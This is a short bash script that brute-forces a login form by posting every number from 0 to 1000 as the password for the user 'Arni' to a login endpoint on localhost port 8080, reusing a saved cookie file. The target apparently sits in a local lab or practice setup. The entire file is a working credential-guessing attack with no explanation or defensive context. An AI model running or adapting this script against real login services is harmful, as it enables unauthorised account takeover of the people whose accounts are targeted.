#!/bin/bash 

for id in {0..1000}; do 
    echo "password : $id"
    curl -X POST -d '{"username": "Arni", "password": "'"$id"'"}' "http://localhost:8080/login" -b cookies.txt
    echo -e "\n"
done 